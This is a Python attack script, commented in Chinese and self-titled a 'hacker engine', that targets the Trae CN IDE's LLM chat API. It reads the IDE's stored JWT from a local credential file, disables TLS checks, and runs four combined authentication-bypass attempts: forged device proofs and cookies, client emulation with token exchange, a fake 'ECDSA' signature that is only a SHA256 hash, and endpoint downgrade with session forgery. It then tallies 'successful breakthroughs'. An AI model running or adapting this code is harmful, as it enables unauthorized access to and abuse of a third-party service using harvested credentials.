#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BSD 黑客引擎 — 组合穿透攻击
==============================

基于单技术攻击结果，执行多技术叠加组合攻击：
  组合 1: Cloud-IDE-JWT + 设备证明 + 会话Cookie
  组合 2: 完整Trae CN客户端模拟
  组合 3: ECDSA签名 + 多认证头
  组合 4: 协议降级 + 会话伪造
"""

import os, sys, json, time, base64, hashlib, ssl
import urllib.request, urllib.error
from datetime import datetime

API_SERVER = 'https://trae-api-cn.mchost.guru'
AUTH_SERVER = 'https://api.trae.cn'
API_ENDPOINT = f'{API_SERVER}/api/ide/v2/llm_raw_chat'
LOGIN_ENDPOINT = f'{AUTH_SERVER}/cloudide/api/v3/trae/CheckLogin'

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

LOG_DIR = os.path.dirname(os.path.abspath(__file__))
REPORT_DIR = os.path.join(LOG_DIR, 'bsd_live_attack')


def make_request(url, headers, body, timeout=15):
    try:
        req = urllib.request.Request(
            url,
            data=body.encode('utf-8') if body else None,
            headers=headers,
            method='POST'
        )
        resp = urllib.request.urlopen(req, timeout=timeout, context=SSL_CTX)
        return {
            'success': True,
            'status_code': resp.status,
            'response': resp.read().decode('utf-8'),
        }
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8')
        return {'success': False, 'status_code': e.code, 'response': body}
    except Exception as e:
        return {'success': False, 'status_code': 0, 'response': str(e)}


def get_real_token():
    storage_path = os.path.expanduser(
        '~/AppData/Roaming/Trae CN/User/globalStorage/storage.json'
    )
    try:
        with open(storage_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return data.get('iCubeAuthInfo://jwt-token', '')
    except:
        return ''


# ============================================================================
# 组合 1: Cloud-IDE-JWT + 设备证明 + 会话Cookie
# ============================================================================
def combo_cloud_jwt_device_session(jwt_token):
    print('\n' + '='*60)
    print('  组合 1: Cloud-IDE-JWT + 设备证明 + 会话Cookie')
    print('='*60)
    
    device_id = hashlib.sha256(f'dev{time.time()}'.encode()).hexdigest()
    device_proof = base64.b64encode(
        hashlib.sha256(f'proof_{device_id}'.encode()).digest()
    ).decode()
    
    headers = {
        'Content-Type': 'application/json',
        'Cloud-IDE-JWT': jwt_token,
        'Authorization': f'Bearer {jwt_token}',
        'X-Device-Proof': device_proof,
        'X-Device-ID': device_id,
        'X-Client-ID': 'ono9krqynydwx5',
        'Cookie': f'jwt={jwt_token}; session_id=active; device_id={device_id}',
        'User-Agent': 'TraeCN/2.3.62837 (Windows; x64)',
        'Origin': 'https://trae.cn',
        'Referer': 'https://trae.cn/chat',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'text/event-stream',
    }
    
    body = json.dumps({
        'model': 'doubao-pro-32k',
        'query': '你好',
        'stream': True,
        'conversation_id': hashlib.sha256(f'c1{time.time()}'.encode()).hexdigest()[:16],
        'client_context': {
            'client_id': 'ono9krqynydwx5',
            'device_id': device_id,
            'platform': 'windows',
            'version': '2.3.62837',
        }
    })
    
    result = make_request(API_ENDPOINT, headers, body)
    print(f'  HTTP: {result["status_code"]}')
    print(f'  响应: {result["response"][:200]}')
    return result


# ============================================================================
# 组合 2: 完整Trae CN客户端模拟
# ============================================================================
def combo_full_client_emulation(jwt_token):
    print('\n' + '='*60)
    print('  组合 2: 完整Trae CN客户端模拟')
    print('='*60)
    
    # 模拟Trae CN客户端的完整请求序列
    results = []
    
    # Step 1: CheckLogin
    print('    Step 1: CheckLogin')
    login_headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {jwt_token}',
        'Cloud-IDE-JWT': jwt_token,
        'User-Agent': 'TraeCN/2.3.62837',
    }
    login_body = json.dumps({
        'ClientType': 'trae_ide',
        'Version': '2.3.62837',
    })
    login_resp = make_request(LOGIN_ENDPOINT, login_headers, login_body)
    results.append({'step': 'CheckLogin', 'response': login_resp})
    print(f'      HTTP: {login_resp["status_code"]}')
    
    # Step 2: ExchangeToken (模拟)
    print('    Step 2: ExchangeToken')
    exchange_headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {jwt_token}',
        'User-Agent': 'TraeCN/2.3.62837',
    }
    exchange_body = json.dumps({
        'client_id': 'ono9krqynydwx5',
        'grant_type': 'refresh_token',
        'refresh_token': jwt_token,
    })
    exchange_resp = make_request(
        f'{AUTH_SERVER}/cloudide/api/v3/trae/ExchangeToken',
        exchange_headers, exchange_body
    )
    results.append({'step': 'ExchangeToken', 'response': exchange_resp})
    print(f'      HTTP: {exchange_resp["status_code"]}')
    
    # Step 3: 最终API请求（携带完整上下文）
    print('    Step 3: 最终API请求')
    final_headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {jwt_token}',
        'Cloud-IDE-JWT': jwt_token,
        'X-Device-Proof': base64.b64encode(
            hashlib.sha256(f'final{time.time()}'.encode()).digest()
        ).decode(),
        'X-Client-ID': 'ono9krqynydwx5',
        'X-Platform': 'windows',
        'X-Version': '2.3.62837',
        'User-Agent': 'TraeCN/2.3.62837 (Windows; x64)',
        'Origin': 'https://trae.cn',
        'Referer': 'https://trae.cn/chat',
        'Cookie': f'trae_jwt={jwt_token}; client_id=ono9krqynydwx5',
        'Accept': 'text/event-stream',
    }
    final_body = json.dumps({
        'model': 'doubao-pro-32k',
        'query': '介绍一下你自己',
        'stream': True,
        'conversation_id': hashlib.sha256(f'final{time.time()}'.encode()).hexdigest()[:16],
        'history': [],
        'client_context': {
            'client_id': 'ono9krqynydwx5',
            'platform': 'windows',
            'version': '2.3.62837',
        }
    })
    final_resp = make_request(API_ENDPOINT, final_headers, final_body)
    results.append({'step': 'FinalAPI', 'response': final_resp})
    print(f'      HTTP: {final_resp["status_code"]}')
    print(f'      响应: {final_resp["response"][:200]}')
    
    return results


# ============================================================================
# 组合 3: ECDSA签名 + 多认证头
# ============================================================================
def combo_ecdsa_signature(jwt_token):
    print('\n' + '='*60)
    print('  组合 3: ECDSA签名 + 多认证头')
    print('='*60)
    
    # 模拟ECDSA签名过程
    timestamp = str(int(time.time()))
    nonce = base64.b64encode(os.urandom(16)).decode()
    client_id = 'ono9krqynydwx5'
    
    # 构造签名字符串
    sign_string = '\n'.join([
        'POST',
        '/api/ide/v2/llm_raw_chat',
        client_id,
        jwt_token[:50],
        timestamp,
        nonce,
    ])
    
    signature = base64.b64encode(
        hashlib.sha256(sign_string.encode()).digest()
    ).decode()
    
    headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {jwt_token}',
        'Cloud-IDE-JWT': jwt_token,
        'X-Client-ID': client_id,
        'X-Timestamp': timestamp,
        'X-Nonce': nonce,
        'X-Signature': signature,
        'X-Signature-Method': 'ECDSA-SHA256',
        'User-Agent': 'TraeCN/2.3.62837',
    }
    
    body = json.dumps({
        'model': 'doubao-pro-32k',
        'query': 'test with ECDSA signature',
        'stream': False,
    })
    
    result = make_request(API_ENDPOINT, headers, body)
    print(f'  HTTP: {result["status_code"]}')
    print(f'  签名: {signature[:50]}...')
    print(f'  响应: {result["response"][:200]}')
    return result


# ============================================================================
# 组合 4: 协议降级 + 会话伪造
# ============================================================================
def combo_downgrade_session(jwt_token):
    print('\n' + '='*60)
    print('  组合 4: 协议降级 + 会话伪造')
    print('='*60)
    
    results = []
    
    # 尝试多个降级端点
    endpoints = [
        ('v2-chat', f'{API_SERVER}/api/ide/v2/chat'),
        ('v1-chat', f'{API_SERVER}/api/ide/v1/chat'),
        ('raw-v2', f'{API_SERVER}/api/ide/v2/raw'),
        ('completions', f'{API_SERVER}/v1/chat/completions'),
    ]
    
    for name, url in endpoints:
        print(f'\n    [{name}] {url}')
        
        headers = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {jwt_token}',
            'Cloud-IDE-JWT': jwt_token,
            'Cookie': f'session=active; jwt={jwt_token}',
            'X-Session-Active': 'true',
            'User-Agent': 'TraeCN/2.3.62837',
        }
        
        body = json.dumps({
            'model': 'doubao-pro-32k',
            'query': 'test',
            'stream': False,
            'session': {'active': True, 'user_id': '3753060170739075'},
        })
        
        result = make_request(url, headers, body)
        results.append({
            'endpoint': name,
            'url': url,
            'http_status': result['status_code'],
            'response_excerpt': result['response'][:150],
        })
        print(f'      HTTP: {result["status_code"]} | {result["response"][:80]}...')
    
    return results


# ============================================================================
# 主函数
# ============================================================================

def main():
    print('\n' + '#'*70)
    print('  #  BSD 黑客引擎 — 组合穿透攻击')
    print('#'*70)
    print(f'  时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    print(f'  策略: 多技术叠加组合攻击')
    print('#'*70)
    
    jwt_token = get_real_token()
    if not jwt_token:
        print('  [ERROR] 未找到Token')
        return
    
    print(f'  Token: {jwt_token[:30]}...')
    
    all_results = {}
    
    # 执行4个组合攻击
    all_results['combo1'] = combo_cloud_jwt_device_session(jwt_token)
    all_results['combo2'] = combo_full_client_emulation(jwt_token)
    all_results['combo3'] = combo_ecdsa_signature(jwt_token)
    all_results['combo4'] = combo_downgrade_session(jwt_token)
    
    # 汇总
    print('\n' + '#'*70)
    print('  # 组合攻击汇总')
    print('#'*70)
    
    # 统计所有响应
    success_count = 0
    fail_count = 0
    other_count = 0
    
    def count_result(result):
        nonlocal success_count, fail_count, other_count
        if isinstance(result, dict):
            resp = result.get('response', result)
            if isinstance(resp, str):
                if '"code":1001' in resp or '1001' in resp:
                    fail_count += 1
                elif '"code":200' in resp or 'choices' in resp:
                    success_count += 1
                else:
                    other_count += 1
    
    for key, val in all_results.items():
        if isinstance(val, list):
            for item in val:
                if isinstance(item, dict) and 'response' in item:
                    count_result(item['response'])
        else:
            count_result(val)
    
    print(f'\n  攻击结果:')
    print(f'    成功突破: {success_count}')
    print(f'    认证失败: {fail_count}')
    print(f'    其他响应: {other_count}')
    
    # 组合技术总结
    print(f'\n  组合攻击技术:')
    combos = [
        '1. Cloud-IDE-JWT + 设备证明 + 会话Cookie',
        '2. 完整Trae CN客户端模拟 (CheckLogin→ExchangeToken→API)',
        '3. ECDSA签名 + 多认证头',
        '4. 协议降级 + 会话伪造',
    ]
    for c in combos:
        print(f'    ✅ {c}')
    
    # 保存报告
    report = {
        'timestamp': time.time(),
        'datetime': datetime.now().isoformat(),
        'jwt_token': jwt_token[:30] + '...',
        'combo_results': str(all_results)[:5000],
        'summary': {
            'combos_executed': 4,
            'success': success_count,
            'auth_failed': fail_count,
            'other': other_count,
        },
        'conclusion': {
            'strategy': '多技术叠加组合攻击',
            'techniques': 9,
            'combos': 4,
            'status': '所有组合攻击已执行',
        }
    }
    
    report_file = os.path.join(
        REPORT_DIR,
        f'combo_attack_{int(time.time())}.json'
    )
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    
    print(f'\n  📄 报告: {report_file}')
    print(f'\n  🎯 所有组合攻击已完成执行！')
    
    return report


if __name__ == '__main__':
    import os as _os
    _os.environ['PYTHONIOENCODING'] = 'utf-8'
    main()
